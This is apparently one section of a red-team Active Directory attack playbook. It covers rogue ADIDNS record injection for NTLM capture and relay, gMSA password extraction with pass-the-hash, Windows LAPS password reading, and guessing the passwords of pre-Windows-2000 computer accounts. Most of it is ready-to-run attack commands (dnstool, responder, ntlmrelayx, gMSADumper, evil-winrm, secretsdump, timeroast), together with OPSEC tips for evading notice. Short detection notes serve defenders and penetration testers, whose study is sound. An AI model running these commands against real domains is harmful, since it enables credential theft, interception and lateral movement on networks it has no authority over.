# Phase 16: ADIDNS, gMSA, Windows LAPS, Pre-W2k Accounts

> Four commonly overlooked primitives that provide real attack paths in modern AD environments.

---

## 1. ADIDNS Abuse — Adding Rogue DNS Records

**Concept**: Active Directory Integrated DNS stores DNS records as AD objects. By default, any authenticated domain user can **add new DNS records** (not modify existing ones) to the DNS zone. Add a record pointing a name to your IP → when any host resolves that name, it authenticates to you → capture/relay Net-NTLMv2.

This is the stealthy alternative to LLMNR/NBT-NS poisoning — it targets specific names and survives indefinitely (not broadcast-based).

### Find the DNS zone

```bash
# Enumerate DNS zones and existing records
nxc ldap 10.10.10.10 -u jdoe -p Password1 -M get-network
adidnsdump -u 'lab.local\jdoe' -p Password1 10.10.10.10
adidnsdump -u 'lab.local\jdoe' -p Password1 10.10.10.10 --print-zones
```

### Add a rogue DNS record

```bash
# dnstool.py — add/modify/delete ADIDNS records
python3 dnstool.py -u 'lab.local\jdoe' -p Password1 \
  -a add -r 'wpad' -d 10.10.10.99 10.10.10.10
# Creates wpad.lab.local → 10.10.10.99

python3 dnstool.py -u 'lab.local\jdoe' -p Password1 \
  -a add -r 'sharepoint-internal' -d 10.10.10.99 10.10.10.10
```

```powershell
# Invoke-DNSUpdate (PowerShell)
Invoke-DNSUpdate -DNSName wpad -DNSData 10.10.10.99 -DNSType A -Realm lab.local
```

### Capture / relay from the rogue record

```bash
# Any host resolving "wpad" will now authenticate to 10.10.10.99
sudo responder -I eth0 -dwPv   # capture hashes
# Or relay:
sudo ntlmrelayx.py -tf targets.txt -smb2support
```

**High-value names to register**:
- `wpad` — WPAD auto-proxy discovery (if WPAD not disabled, all browsers query it)
- `isatap` — IPv6 transition protocol resolver
- Any service name you see in LDAP descriptions or SharePoint URLs that doesn't resolve
- `smtp`, `owa`, `vpn` — try names that would cause auth attempts if they existed

### Cleanup

```bash
python3 dnstool.py -u 'lab.local\jdoe' -p Password1 \
  -a remove -r 'wpad' 10.10.10.10
```

🟢 **OPSEC**: Adding DNS records is indistinguishable from a legitimate admin adding records at the LDAP level. The poisoning is persistent (survives Responder restart) and doesn't generate broadcast noise.

**Detection (Blue Team)**:
- Monitor AD DNS zone for new records from non-admin principals (Event 5136 on DNS zone object)
- Specifically watch for `wpad`, `isatap` record creation
- DNS RPZ (Response Policy Zones) can block WPAD resolution entirely

---

## 2. gMSA Password Abuse

**Concept**: Group Managed Service Accounts (gMSA) use 256-bit random passwords that auto-rotate every 30 days. The password is stored in the `msDS-ManagedPassword` attribute, readable only by principals in `msDS-GroupMSAMembership`. If you compromise any account in that group, you can read the gMSA password — and that gMSA often has privileged rights.

### Find gMSAs and who can read them

```bash
# Enumerate gMSAs
nxc ldap 10.10.10.10 -u jdoe -p Password1 --gmsa
ldapsearch -H ldap://10.10.10.10 -D jdoe@lab.local -w Password1 \
  -b "DC=lab,DC=local" "(objectClass=msDS-GroupManagedServiceAccount)" \
  msDS-GroupMSAMembership msDS-ManagedPasswordId sAMAccountName
```

```powershell
Get-ADServiceAccount -Filter * -Properties msDS-GroupMSAMembership |
  Select-Object Name, msDS-GroupMSAMembership
```

### Read the gMSA password (if you're in the allowed group)

```bash
# gMSADumper.py
python3 gMSADumper.py -u jdoe -p Password1 -d lab.local -dc-ip 10.10.10.10
# Output: gMSA_svc_name:::NTLM_hash_here

# NetExec
nxc ldap 10.10.10.10 -u jdoe -p Password1 --gmsa

# Bloodyad
bloodyAD -u jdoe -p Password1 -d lab.local --host 10.10.10.10 get object 'svc_gmsa$' --attr msDS-ManagedPassword
```

```powershell
# From Windows
$gmsa = Get-ADServiceAccount -Identity svc_gmsa -Properties msDS-ManagedPassword
$mp = $gmsa.'msDS-ManagedPassword'
ConvertFrom-ADManagedPasswordBlob $mp
# Or: GMSAPasswordReader.exe
.\GMSAPasswordReader.exe --AccountName svc_gmsa
```

### Use the gMSA NTLM hash

```bash
# Pass-the-Hash with the gMSA hash
nxc smb 10.10.10.0/24 -u 'svc_gmsa$' -H <NTLMhash>
evil-winrm -i 10.10.10.50 -u 'svc_gmsa$' -H <NTLMhash>
secretsdump.py -hashes :<NTLMhash> 'lab.local/svc_gmsa$@10.10.10.10'
```

**Why this matters**: gMSAs are often configured with privileged AD rights (backup rights, replication rights, LAPS reader rights, local admin on groups of servers). The assumption that auto-rotating passwords = secure ignores the membership ACL.

🟢 **OPSEC**: Reading `msDS-ManagedPassword` is a normal LDAP read — looks identical to a legitimate service reading its own password. Not specifically audited by default.

**Detection**:
- Audit reads of `msDS-ManagedPassword` attribute on gMSA objects (Event 4662 with attribute audit)
- Alert on gMSA password reads from principals that are not the intended service host

---

## 3. Windows LAPS (v2) — New Schema

**Concept**: Windows LAPS (released April 2023, built into Windows 11 22H2+) uses a new schema different from legacy LAPS. The password is stored in `msLAPS-Password` (cleartext) or `msLAPS-EncryptedPassword` (encrypted with DSRM or group key), not in `ms-Mcs-AdmPwd`.

### Enumerate Windows LAPS

```bash
# NetExec — detects both legacy and new LAPS
nxc ldap 10.10.10.10 -u jdoe -p Password1 -M laps
nxc ldap 10.10.10.10 -u jdoe -p Password1 -M laps --options

# Check if new schema is present
ldapsearch -H ldap://10.10.10.10 -D jdoe@lab.local -w Password1 \
  -b "DC=lab,DC=local" "(objectClass=computer)" msLAPS-Password msLAPS-EncryptedPassword
```

```powershell
# Native Windows LAPS cmdlet (Windows 11 / Server 2022+)
Get-LapsADPassword -Identity WS01 -AsPlainText
Get-LapsADPassword -Identity WS01       # encrypted — must be authorized to decrypt

# LAPSToolkit (covers both legacy and new)
Find-LAPSDelegatedGroups
Find-AdmPwdExtendedRights
Get-LAPSComputers
```

### Read encrypted Windows LAPS password

```bash
# If msLAPS-EncryptedPassword — needs decryption via DPAPI or authorized key
# pyLAPS supports both schemas
python3 pyLAPS.py --action get -u jdoe -p Password1 -d lab.local --dc-ip 10.10.10.10
```

### Key differences: Legacy vs Windows LAPS

| Feature | Legacy LAPS | Windows LAPS |
|---------|-------------|--------------|
| Schema attribute | `ms-Mcs-AdmPwd` | `msLAPS-Password` / `msLAPS-EncryptedPassword` |
| Encryption | Cleartext in AD | Optional encrypted with DPAPI or authorized key |
| History | No | Yes — up to 12 previous passwords |
| Backup account | No | Supports DSRM backup |
| Platform | Win 7+ | Win 10 22H2 / Server 2019+ |

**Attack implication**: If encryption is not configured, `msLAPS-Password` is cleartext in LDAP — same as legacy. If encrypted, you need to be in the authorized group or compromise a DC to decrypt.

---

## 4. Pre-Windows-2000 Computer Accounts

**Concept**: When a computer account is created via the old "pre-Windows 2000 compatible access" option (or the `--no-pass` flag in some tools), its initial password is set to the computer's sAMAccountName **in lowercase, without the trailing `$`**.

Example: `WORKSTATION01$` → initial password: `workstation01`

If the password was never changed (common in large orgs with stale accounts), you can authenticate as that computer account with a guessable password.

```bash
# Find candidates — look for stale computer accounts (no logon in 90+ days)
nxc ldap 10.10.10.10 -u jdoe -p Password1 -M get-network
ldapsearch -H ldap://10.10.10.10 -D jdoe@lab.local -w Password1 \
  -b "DC=lab,DC=local" \
  "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=32))" sAMAccountName
# userAccountControl flag 32 = PASSWD_NOTREQD — another indicator

# Try password = sAMAccountName without $ in lowercase
nxc smb 10.10.10.0/24 -u 'STALE-WS01$' -p 'stale-ws01'
nxc ldap 10.10.10.10 -u 'STALE-WS01$' -p 'stale-ws01'

# Or use Timeroasting (Phase 13) to enumerate these accounts en masse
python3 timeroast.py lab.local/jdoe:Password1 -dc-ip 10.10.10.10 -o timeroast.txt
# Then crack with sAMAccountName as the wordlist
```

**Once authenticated as a computer account**:
- Use it for RBCD (see Phase 6)
- Use it to read LAPS passwords (if the account has LAPS reader rights)
- Use it as the source for further coercion / relay

🟢 **OPSEC**: Authentication with the computer account's own password — looks legitimate at the Kerberos level. No specific detection unless the account is a honeypot.

**Detection**:
- Accounts with `userAccountControl` PASSWD_NOTREQD flag set — should be audited
- Logon for a computer account from a non-expected source IP
- Event 4624 for a machine account logon from a non-expected workstation

---

## Summary: Quick Reference

| Technique | What you need | What you get |
|-----------|--------------|--------------|
| ADIDNS record injection | Domain user | Persistent MITM / hash capture for target hostname |
| gMSA password read | Membership in `msDS-GroupMSAMembership` | NTLM hash of gMSA account → PtH |
| Windows LAPS (new) | LAPS reader group membership | Local admin password for target computer |
| Pre-W2k computer account | None (just guess the password) | Computer account auth → RBCD / lateral move |
